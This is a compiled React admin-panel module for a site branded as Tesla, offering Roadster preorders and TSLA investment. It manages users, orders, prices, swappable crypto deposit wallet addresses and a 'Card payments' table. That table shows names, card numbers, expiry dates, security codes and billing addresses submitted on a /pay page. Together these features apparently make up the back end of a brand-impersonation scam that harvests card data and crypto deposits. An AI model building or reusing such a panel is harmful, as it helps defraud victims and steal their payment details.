import { i as __toESM } from "../_runtime.mjs";
import { a as getWebsiteContent, c as setPrices, i as getPrices, l as setWebsiteContent, n as adminLogout, r as getCryptoDestinations, s as setCryptoDestinations } from "./admin-DIQeDyiU.mjs";
import { n as require_react } from "../_libs/@radix-ui/react-compose-refs+[...].mjs";
import { a as require_jsx_runtime } from "../_libs/react+tanstack__react-query.mjs";
import { t as Button } from "./button-B2wejuZy.mjs";
import { b as useNavigate } from "../_libs/@tanstack/react-router+[...].mjs";
import { i as getPaymentSubmissions, n as getAdminStats, o as updateOrderStatus, r as getAdminUsers, t as getAdminOrders } from "./admin.functions-hOmY29lO.mjs";
import { c as FileText, d as CreditCard, i as Settings, m as Bitcoin, n as Users, o as LogOut, r as ShoppingCart, s as LayoutDashboard } from "../_libs/lucide-react.mjs";
//#region node_modules/.nitro/vite/services/ssr/assets/admin-dashboard-CbQm7Amg.js
var import_react = /* @__PURE__ */ __toESM(require_react());
var import_jsx_runtime = require_jsx_runtime();
var TABS = [
	{
		id: "overview",
		label: "Overview",
		icon: LayoutDashboard
	},
	{
		id: "users",
		label: "Users",
		icon: Users
	},
	{
		id: "orders",
		label: "Orders",
		icon: ShoppingCart
	},
	{
		id: "prices",
		label: "Prices",
		icon: CreditCard
	},
	{
		id: "crypto",
		label: "Crypto destinations",
		icon: Bitcoin
	},
	{
		id: "payments",
		label: "Card payments",
		icon: FileText
	},
	{
		id: "content",
		label: "Website content",
		icon: Settings
	}
];
function AdminLayout({ children, activeTab, onTabChange }) {
	const navigate = useNavigate();
	const [collapsed, setCollapsed] = (0, import_react.useState)(false);
	function signOut() {
		adminLogout();
		navigate({ to: "/admin" });
	}
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("main", {
		className: "min-h-[100svh] w-full bg-ink text-chrome flex",
		children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("aside", {
			className: `border-r border-chrome/10 bg-ink/50 backdrop-blur shrink-0 transition-all duration-300 ${collapsed ? "w-16" : "w-64"}`,
			children: [
				/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
					className: "flex items-center justify-between h-16 px-5 border-b border-chrome/10",
					children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("span", {
						className: `font-wide text-xl font-bold uppercase tracking-widest ${collapsed ? "hidden" : "block"}`,
						children: ["Tesla", /* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
							className: "text-crimson",
							children: "Admin"
						})]
					}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("button", {
						onClick: () => setCollapsed(!collapsed),
						className: "p-2 text-chrome/60 hover:text-chrome",
						"aria-label": "Toggle sidebar",
						children: collapsed ? /* @__PURE__ */ (0, import_jsx_runtime.jsx)("svg", {
							className: "w-5 h-5",
							fill: "none",
							stroke: "currentColor",
							viewBox: "0 0 24 24",
							strokeWidth: 2,
							children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)("path", { d: "M5 12h14" })
						}) : /* @__PURE__ */ (0, import_jsx_runtime.jsx)("svg", {
							className: "w-5 h-5",
							fill: "none",
							stroke: "currentColor",
							viewBox: "0 0 24 24",
							strokeWidth: 2,
							children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)("path", { d: "M19 12H5" })
						})
					})]
				}),
				/* @__PURE__ */ (0, import_jsx_runtime.jsx)("nav", {
					className: "mt-6 space-y-1 px-3",
					children: TABS.map((tab) => {
						const active = activeTab === tab.id;
						const Icon = tab.icon;
						return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("button", {
							onClick: () => onTabChange(tab.id),
							className: `flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-medium transition ${active ? "bg-chrome text-ink" : "text-chrome/60 hover:bg-chrome/10 hover:text-chrome"}`,
							children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Icon, { className: "w-5 h-5" }), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
								className: collapsed ? "hidden" : "block",
								children: tab.label
							})]
						}, tab.id);
					})
				}),
				/* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
					className: "absolute bottom-0 left-0 right-0 p-4 border-t border-chrome/10",
					children: /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("button", {
						onClick: signOut,
						className: `flex items-center gap-3 w-full px-4 py-3 rounded-xl border border-chrome/20 bg-transparent text-sm font-medium text-chrome/60 hover:bg-chrome/10 hover:text-chrome ${collapsed ? "justify-center" : "justify-start"}`,
						children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(LogOut, { className: "w-5 h-5" }), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
							className: collapsed ? "hidden" : "block",
							children: "Sign out"
						})]
					})
				})
			]
		}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
			className: "flex-1 pt-6 pb-20 px-6 md:px-10 overflow-y-auto",
			children
		})]
	});
}
var statCards = [
	{
		label: "Users",
		icon: Users,
		color: "bg-chrome/10 text-chrome"
	},
	{
		label: "Orders",
		icon: CreditCard,
		color: "bg-chrome/10 text-chrome"
	},
	{
		label: "Deposits",
		icon: FileText,
		color: "bg-crimson/10 text-crimson"
	},
	{
		label: "Card payments",
		icon: LayoutDashboard,
		color: "bg-gray-900/10 text-gray-900"
	}
];
function DashboardOverview() {
	const [stats, setStats] = (0, import_react.useState)({
		users: 0,
		orders: 0,
		deposits: 0,
		payments: 0
	});
	const [loading, setLoading] = (0, import_react.useState)(true);
	(0, import_react.useEffect)(() => {
		const load = async () => {
			const s = await getAdminStats();
			setStats(s);
			setLoading(false);
		};
		load();
	}, []);
	const prices = getPrices();
	const crypto = getCryptoDestinations();
	if (loading) return /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
		className: "text-chrome/60",
		children: "Loading…"
	});
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
		className: "space-y-6",
		children: [
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
				className: "grid gap-4 sm:grid-cols-2 lg:grid-cols-4",
				children: statCards.map((c, i) => {
					const values = [
						stats.users,
						stats.orders,
						stats.deposits,
						stats.payments
					];
					return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
						className: "rounded-3xl border border-chrome/15 p-6",
						children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
							className: "text-xs uppercase tracking-widest text-chrome/50",
							children: c.label
						}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
							className: "mt-2 font-wide text-3xl",
							children: values[i]
						})]
					}, c.label);
				})
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "rounded-3xl border border-chrome/15 p-6",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h3", {
					className: "font-wide text-xl uppercase mb-4",
					children: "Configured prices"
				}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
					className: "grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4",
					children: Object.entries(prices).map(([model, price]) => /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
						className: "p-3 rounded-xl border border-chrome/10 bg-chrome/5",
						children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
							className: "text-xs text-chrome/60",
							children: model
						}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
							className: "mt-1 font-wide text-sm",
							children: price
						})]
					}, model))
				})]
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "rounded-3xl border border-chrome/15 p-6",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h3", {
					className: "font-wide text-xl uppercase mb-4",
					children: "Crypto destinations"
				}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
					className: "grid gap-3 sm:grid-cols-2 lg:grid-cols-3",
					children: Object.entries(crypto).map(([label, addr]) => /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
						className: "p-3 rounded-xl border border-chrome/10",
						children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
							className: "text-xs text-chrome/60",
							children: label
						}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
							className: "mt-1 text-sm break-all text-chrome",
							children: addr
						})]
					}, label))
				})]
			})
		]
	});
}
function UserManagement() {
	const [users, setUsers] = (0, import_react.useState)([]);
	const [loading, setLoading] = (0, import_react.useState)(true);
	(0, import_react.useEffect)(() => {
		const load = async () => {
			const list = await getAdminUsers();
			setUsers(list);
			setLoading(false);
		};
		load();
	}, []);
	if (loading) return /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
		className: "text-chrome/60",
		children: "Loading users…"
	});
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
		className: "rounded-3xl border border-chrome/15 p-6",
		children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h3", {
			className: "font-wide text-xl uppercase mb-4",
			children: "All users"
		}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
			className: "overflow-x-auto",
			children: /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("table", {
				className: "w-full text-left text-sm border-collapse",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("thead", { children: /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("tr", {
					className: "border-b border-chrome/10",
					children: [
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("th", {
							className: "pb-3 text-xs uppercase tracking-widest text-chrome/50",
							children: "User ID"
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("th", {
							className: "pb-3 text-xs uppercase tracking-widest text-chrome/50",
							children: "Email"
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("th", {
							className: "pb-3 text-xs uppercase tracking-widest text-chrome/50",
							children: "Orders"
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("th", {
							className: "pb-3 text-xs uppercase tracking-widest text-chrome/50",
							children: "Deposits"
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("th", {
							className: "pb-3 text-xs uppercase tracking-widest text-chrome/50",
							children: "Wallet balance"
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("th", {
							className: "pb-3 text-xs uppercase tracking-widest text-chrome/50",
							children: "Joined"
						})
					]
				}) }), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("tbody", {
					className: "divide-y divide-chrome/10",
					children: [users.map((u) => /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("tr", {
						className: "hover:bg-chrome/5 transition",
						children: [
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
								className: "py-3 text-chrome/90 truncate max-w-xs",
								children: u.id
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
								className: "py-3 text-chrome/90",
								children: u.email
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
								className: "py-3 text-chrome/90",
								children: u.orders
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
								className: "py-3 text-chrome/90",
								children: u.deposits
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("td", {
								className: "py-3 text-chrome/90",
								children: ["$", u.wallet.toLocaleString()]
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
								className: "py-3 text-chrome/60 text-xs",
								children: u.createdAt ? new Date(u.createdAt).toLocaleDateString() : "—"
							})
						]
					}, u.id)), users.length === 0 && /* @__PURE__ */ (0, import_jsx_runtime.jsx)("tr", { children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
						colSpan: 6,
						className: "py-6 text-center text-chrome/50",
						children: "No users found."
					}) })]
				})]
			})
		})]
	});
}
var STATUSES = [
	"pending",
	"paid",
	"shipped",
	"cancelled"
];
function OrderManagement() {
	const [orders, setOrders] = (0, import_react.useState)([]);
	const [loading, setLoading] = (0, import_react.useState)(true);
	(0, import_react.useEffect)(() => {
		const load = async () => {
			const list = await getAdminOrders();
			setOrders(list);
			setLoading(false);
		};
		load();
	}, []);
	async function setStatus(orderId, status) {
		await updateOrderStatus({ data: {
			orderId,
			status
		} });
		setOrders((prev) => prev.map((o) => o.id === orderId ? {
			...o,
			status
		} : o));
	}
	if (loading) return /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
		className: "text-chrome/60",
		children: "Loading orders…"
	});
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
		className: "rounded-3xl border border-chrome/15 p-6",
		children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h3", {
			className: "font-wide text-xl uppercase mb-4",
			children: "Orders & purchase status"
		}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
			className: "overflow-x-auto",
			children: /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("table", {
				className: "w-full text-left text-sm border-collapse",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("thead", { children: /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("tr", {
					className: "border-b border-chrome/10",
					children: [
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("th", {
							className: "pb-3 text-xs uppercase tracking-widest text-chrome/50",
							children: "Order ID"
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("th", {
							className: "pb-3 text-xs uppercase tracking-widest text-chrome/50",
							children: "Model"
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("th", {
							className: "pb-3 text-xs uppercase tracking-widest text-chrome/50",
							children: "Price"
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("th", {
							className: "pb-3 text-xs uppercase tracking-widest text-chrome/50",
							children: "Payment method"
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("th", {
							className: "pb-3 text-xs uppercase tracking-widest text-chrome/50",
							children: "Status"
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("th", {
							className: "pb-3 text-xs uppercase tracking-widest text-chrome/50",
							children: "Date"
						})
					]
				}) }), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("tbody", {
					className: "divide-y divide-chrome/10",
					children: [orders.map((o) => /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("tr", {
						className: "hover:bg-chrome/5 transition",
						children: [
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
								className: "py-3 text-chrome/90 truncate max-w-xs",
								children: o.id
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
								className: "py-3 text-chrome/90",
								children: o.model
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
								className: "py-3 text-chrome/90",
								children: o.price
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
								className: "py-3 text-chrome/90",
								children: o.paymentMethod ?? "—"
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
								className: "py-3",
								children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)("select", {
									value: o.status,
									onChange: (e) => setStatus(o.id, e.target.value),
									className: "rounded-lg border border-chrome/20 bg-transparent px-3 py-1.5 text-xs text-chrome outline-none focus:border-chrome/60",
									children: STATUSES.map((s) => /* @__PURE__ */ (0, import_jsx_runtime.jsx)("option", {
										value: s,
										children: s
									}, s))
								})
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
								className: "py-3 text-chrome/60 text-xs",
								children: new Date(o.createdAt).toLocaleDateString()
							})
						]
					}, o.id)), orders.length === 0 && /* @__PURE__ */ (0, import_jsx_runtime.jsx)("tr", { children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
						colSpan: 6,
						className: "py-6 text-center text-chrome/50",
						children: "No orders found."
					}) })]
				})]
			})
		})]
	});
}
var MODELS = [
	"Model 3",
	"Model Y",
	"Model S",
	"Model X",
	"Cybertruck",
	"Cybercab",
	"Semi",
	"Roadster"
];
function PriceManagement() {
	const [prices, setPricesState] = (0, import_react.useState)(getPrices());
	const [msg, setMsg] = (0, import_react.useState)(null);
	function save() {
		setPrices(prices);
		setMsg("Prices saved.");
		setTimeout(() => setMsg(null), 3e3);
	}
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
		className: "rounded-3xl border border-chrome/15 p-6",
		children: [
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h3", {
				className: "font-wide text-xl uppercase mb-4",
				children: "Adjust vehicle prices"
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
				className: "text-sm text-chrome/60 mb-6",
				children: "Changes apply across the website."
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
				className: "grid gap-4 sm:grid-cols-2 lg:grid-cols-4",
				children: MODELS.map((model) => /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
					className: "p-4 rounded-xl border border-chrome/10",
					children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
						className: "text-xs uppercase tracking-widest text-chrome/50 mb-2",
						children: model
					}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
						type: "text",
						value: prices[model] ?? "",
						onChange: (e) => setPricesState({
							...prices,
							[model]: e.target.value
						}),
						placeholder: "$0.00",
						className: "w-full rounded-lg border border-chrome/20 bg-transparent px-3 py-2 text-chrome outline-none focus:border-chrome/60"
					})]
				}, model))
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
				className: "mt-6 flex justify-end",
				children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Button, {
					onClick: save,
					className: "h-11 rounded-full bg-chrome text-ink text-sm font-semibold uppercase hover:bg-chrome/85",
					children: "Save prices"
				})
			}),
			msg && /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
				className: "mt-4 text-sm text-chrome/70",
				children: msg
			})
		]
	});
}
var CRYPTO_METHODS = [
	"Bitcoin",
	"USDT",
	"Ethereum"
];
function CryptoManagement() {
	const [destinations, setDestinations] = (0, import_react.useState)(getCryptoDestinations());
	const [msg, setMsg] = (0, import_react.useState)(null);
	function save() {
		setCryptoDestinations(destinations);
		setMsg("Crypto destinations saved.");
		setTimeout(() => setMsg(null), 3e3);
	}
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
		className: "rounded-3xl border border-chrome/15 p-6",
		children: [
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h3", {
				className: "font-wide text-xl uppercase mb-4",
				children: "Update crypto payment destinations"
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
				className: "text-sm text-chrome/60 mb-6",
				children: "These addresses appear on the deposit screens."
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
				className: "space-y-4",
				children: CRYPTO_METHODS.map((method) => /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
					className: "flex flex-col gap-2",
					children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("label", {
						className: "text-xs uppercase tracking-widest text-chrome/50",
						children: method
					}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
						type: "text",
						value: destinations[method] ?? "",
						onChange: (e) => setDestinations({
							...destinations,
							[method]: e.target.value
						}),
						placeholder: "wallet address",
						className: "w-full rounded-lg border border-chrome/20 bg-transparent px-4 py-3 text-chrome outline-none focus:border-chrome/60"
					})]
				}, method))
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Button, {
				onClick: save,
				className: "h-11 rounded-full bg-chrome text-ink text-sm font-semibold uppercase hover:bg-chrome/85",
				children: "Save destinations"
			}),
			msg && /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
				className: "mt-4 text-sm text-chrome/70",
				children: msg
			})
		]
	});
}
function PaymentSubmissions() {
	const [submissions, setSubmissions] = (0, import_react.useState)([]);
	const [loading, setLoading] = (0, import_react.useState)(true);
	(0, import_react.useEffect)(() => {
		const load = async () => {
			const list = await getPaymentSubmissions();
			setSubmissions(list);
			setLoading(false);
		};
		load();
	}, []);
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
		className: "rounded-3xl border border-chrome/15 p-6",
		children: [
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h3", {
				className: "font-wide text-xl uppercase mb-4",
				children: "Card payment submissions"
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
				className: "text-sm text-chrome/60 mb-6",
				children: "Details filled in on the /pay page."
			}),
			loading ? /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
				className: "text-chrome/60",
				children: "Loading…"
			}) : submissions.length === 0 ? /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
				className: "text-sm text-chrome/60",
				children: "No card payments submitted yet."
			}) : /* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
				className: "overflow-x-auto",
				children: /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("table", {
					className: "w-full text-left text-xs border-collapse",
					children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("thead", { children: /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("tr", {
						className: "border-b border-chrome/10",
						children: [
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("th", {
								className: "pb-3 text-xs uppercase tracking-widest text-chrome/50",
								children: "Date"
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("th", {
								className: "pb-3 text-xs uppercase tracking-widest text-chrome/50",
								children: "Name on card"
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("th", {
								className: "pb-3 text-xs uppercase tracking-widest text-chrome/50",
								children: "Card number"
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("th", {
								className: "pb-3 text-xs uppercase tracking-widest text-chrome/50",
								children: "Expiry"
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("th", {
								className: "pb-3 text-xs uppercase tracking-widest text-chrome/50",
								children: "Security code"
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("th", {
								className: "pb-3 text-xs uppercase tracking-widest text-chrome/50",
								children: "Street"
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("th", {
								className: "pb-3 text-xs uppercase tracking-widest text-chrome/50",
								children: "City"
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("th", {
								className: "pb-3 text-xs uppercase tracking-widest text-chrome/50",
								children: "State"
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("th", {
								className: "pb-3 text-xs uppercase tracking-widest text-chrome/50",
								children: "Zip"
							}),
							/* @__PURE__ */ (0, import_jsx_runtime.jsx)("th", {
								className: "pb-3 text-xs uppercase tracking-widest text-chrome/50",
								children: "Save card"
							})
						]
					}) }), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("tbody", {
						className: "divide-y divide-chrome/10",
						children: submissions.map((s) => /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("tr", {
							className: "hover:bg-chrome/5 transition",
							children: [
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
									className: "py-3 text-chrome/90",
									children: new Date(s.createdAt).toLocaleString()
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
									className: "py-3 text-chrome/90 truncate max-w-xs",
									children: s.cardName
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
									className: "py-3 text-chrome/90 truncate max-w-xs",
									children: s.cardNumber.replace(/\d(?=\d{4})/g, "•")
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
									className: "py-3 text-chrome/90",
									children: s.expiry
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
									className: "py-3 text-chrome/90",
									children: s.securityCode.replace(/\d/g, "•")
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
									className: "py-3 text-chrome/90 truncate max-w-xs",
									children: s.street
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
									className: "py-3 text-chrome/90",
									children: s.city
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
									className: "py-3 text-chrome/90",
									children: s.state
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
									className: "py-3 text-chrome/90",
									children: s.zip
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)("td", {
									className: "py-3 text-chrome/90",
									children: s.saveCard ? "Yes" : "No"
								})
							]
						}, s.id))
					})]
				})
			})
		]
	});
}
var CONTENT_FIELDS = [
	{
		key: "heroTitle",
		label: "Hero title",
		placeholder: "Tesla Roadster — Models and Investments"
	},
	{
		key: "heroDescription",
		label: "Hero description",
		placeholder: "Preorder the new Tesla Roadster or invest in TSLA from one place."
	},
	{
		key: "stocksTitle",
		label: "Stocks section title",
		placeholder: "Invest in Tesla"
	},
	{
		key: "stocksDescription",
		label: "Stocks section description",
		placeholder: "Own a piece of the company building electric cars..."
	},
	{
		key: "reserveTitle",
		label: "Reserve section title",
		placeholder: "Preorder the new Roadster"
	},
	{
		key: "reserveDescription",
		label: "Reserve section description",
		placeholder: "Deliveries from 2028"
	},
	{
		key: "footerText",
		label: "Footer text",
		placeholder: "Tesla © 2026 · Concept"
	}
];
function ContentManagement() {
	const [content, setContent] = (0, import_react.useState)(getWebsiteContent());
	const [msg, setMsg] = (0, import_react.useState)(null);
	function save() {
		setWebsiteContent(content);
		setMsg("Website content saved.");
		setTimeout(() => setMsg(null), 3e3);
	}
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
		className: "rounded-3xl border border-chrome/15 p-6",
		children: [
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h3", {
				className: "font-wide text-xl uppercase mb-4",
				children: "Update website content"
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
				className: "text-sm text-chrome/60 mb-6",
				children: "Changes apply across public pages."
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
				className: "space-y-4",
				children: CONTENT_FIELDS.map((field) => /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
					className: "flex flex-col gap-2",
					children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("label", {
						className: "text-xs uppercase tracking-widest text-chrome/50",
						children: field.label
					}), /* @__PURE__ */ (0, import_jsx_runtime.jsx)("textarea", {
						value: content[field.key] ?? "",
						onChange: (e) => setContent({
							...content,
							[field.key]: e.target.value
						}),
						placeholder: field.placeholder,
						rows: 2,
						className: "w-full rounded-lg border border-chrome/20 bg-transparent px-4 py-3 text-chrome outline-none focus:border-chrome/60"
					})]
				}, field.key))
			}),
			/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Button, {
				onClick: save,
				className: "h-11 rounded-full bg-chrome text-ink text-sm font-semibold uppercase hover:bg-chrome/85",
				children: "Save content"
			}),
			msg && /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
				className: "mt-4 text-sm text-chrome/70",
				children: msg
			})
		]
	});
}
function AdminDashboard() {
	const [activeTab, setActiveTab] = (0, import_react.useState)("overview");
	return /* @__PURE__ */ (0, import_jsx_runtime.jsx)(AdminLayout, {
		activeTab,
		onTabChange: setActiveTab,
		children: /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
			className: "space-y-6",
			children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
				className: "flex items-center justify-between",
				children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)("h1", {
					className: "font-wide text-3xl uppercase",
					children: "Admin panel"
				})
			}), {
				overview: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(DashboardOverview, {}),
				users: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(UserManagement, {}),
				orders: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(OrderManagement, {}),
				prices: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(PriceManagement, {}),
				crypto: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(CryptoManagement, {}),
				payments: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(PaymentSubmissions, {}),
				content: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(ContentManagement, {})
			}[activeTab]]
		})
	});
}
var SplitComponent = AdminDashboard;
//#endregion
export { SplitComponent as component };
